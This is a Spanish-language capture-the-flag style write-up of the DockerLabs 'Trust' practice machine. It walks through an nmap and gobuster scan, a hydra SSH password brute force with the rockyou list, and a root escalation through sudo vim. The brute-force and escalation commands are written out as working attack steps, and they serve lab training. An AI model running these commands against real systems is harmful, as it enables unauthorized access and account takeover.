---
layout: single
title: Trust - DockerLabs
excerpt: "Maquina Linux vulnerada a travez de un ataque de fuerza bruta"
date: 2024-05-17
classes: wide
header:
  teaser: /assets/images/logos/logo_dockerlabs.png
  teaser_home_page: true
categories:
  - DockerLabs
tags:
  - linux
  - Muy facil
  - Fuerza Buta
---

<p align="center">
  <img width="460" height="300" src="/assets/images/logos/logo_dockerlabs.png">
</p>

Esta maquina está clasificada como "Muy Facil" en la plataforma de [DockerLabs](https://dockerlabs.es/#/), muy útil para practicar ataque de fuerza bruta.

# Herramientas

    nmap
    hydra

# 1- Enumeración

Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros

```bash
sudo nmap -p- --open -sS -sC -sV -n -Pn 172.17.0.2 -oN nmap.txt
```

| Parametro | Descripción                        |
| --------- | ---------------------------------- |
| -p-       | Escanear todos los puertos         |
| --open    | Mostrar los puertos abiertos       |
| -sS       | Sondeo de tipo SYN sigiloso        |
| -sV       | Habilita la detección de versiones |
| -n        | Sin resolución de DNS              |
| -Pn       | Omitir el descubrimiento de hosts  |
| -oN       | Formato de salida del archivo      |

Finalizado el escaneo podemos ver que se encuentran 2 puertos abiertos 22 que corresponde al servicio de SSH y el puerto 80 al servicio web Apache

```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 12:22 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```

Procedo a investigar el puerto 80 en el navegador ingreso la siguiente URL `http://172.17.0.2` en el cual está la pagina de por default del servicio Apache

![[000trust.png]](/assets/images/writetup-dockerlabs-trust/trust/000trust.png)

La pagina no tiene nada mas interesante, por lo tanto procedo a realizar fuzzing web a ver si me encuentro con algo mas

```bash
gobuster dir -n 404 -t 64 -u http://172.17.0.2/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x txt,py,sh,php
```

| Parametro | Descripcion                     |
| --------- | ------------------------------- |
| -n        | No imprimir códigos de estado   |
| -t        | cantidad de hilos en paralelo   |
| -u        | URL                             |
| -w        | Ruta al diccionario             |
| -x        | Extensiones de archivo a buscar |

Finalizado el fuzzing se observa que hay un directorio secret.php

```css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,py,sh,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

procedo a ver que hay en ese directorio ingresando la siguiente url en el navegador `http://172.17.0.2/secret.php`

![]/assets/images/writetup/dockerlabs/trust/002trust.png

Me encuentro con el siguiente mensaje "Hola Mario, Esta web no se puede hackear." no me encuentro con nada mas en esta web, por lo tanto tengo un posible usuario llamado Mario, el cual voy a usar para hacer fuerza bruta al servicio SSH con la herramienta Hydra

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
```

| Parametro | Descripción                               |
| --------- | ----------------------------------------- |
| -l        | usario                                    |
| -P        | carga varias contraseñas desde un ARCHIVO |
| -t        | cantidad de hilos en paralelo             |
| ssh       | protocolo a atacar                        |

El ataque de fuerza bruta confirma el usuario mario y muestra la contraseña chocolate

```css
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-14 12:48:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344400 login tries (l:1/p:14344400), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 25 final worker threads did not complete until end.
[ERROR] 25 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-14 12:48:54
```

con estos datos procedo a realizar la intrusión en el equipo mediante el servicio SSH

# 2- Intrusión

Conexión a la maquina victima por el servicio SSH

```bash
ssh mario@172.17.0.2
```

al solicitar la contraseña ingreso `chocolate` y me permite el acceso a la maquina victima con el usuario mario intrusión realizada

![]/assets/images/writetup/dockerlabs/trust/003trust.png

# 3- Escalada de privilegios

Llego de momento de escalar privilegios y ser el usuario root, para ello voy a ejeutar el siguiente comando `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.

![]/assets/images/writetup/dockerlabs/trust/004trust.png

Se observa que se puede ejecutar el binario `/usr/bin/vim` como el usuario **root**. Por lo tanto se procede a investigar en la pagina [GTFOBins](https://gtfobins.github.io/) como explotar este binario

ejecutando el siguiente comando vamos a tener acceso a root

```bash
sudo vim -c ':!/bin/sh'
```

Listo! se logró escalar privilegios a al usuario root

![]/assets/images/writetup/dockerlabs/trust/005trust.png
